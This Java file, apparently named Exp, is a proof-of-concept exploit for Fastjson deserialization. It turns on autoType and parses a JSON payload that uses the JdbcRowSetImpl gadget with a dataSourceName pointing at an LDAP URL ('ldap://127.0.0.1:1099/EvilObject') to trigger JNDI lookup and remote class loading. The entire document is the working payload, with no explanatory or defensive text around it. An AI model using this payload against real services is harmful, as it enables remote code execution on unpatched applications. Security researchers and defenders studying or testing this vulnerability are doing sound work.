import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Exp {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1099/EvilObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}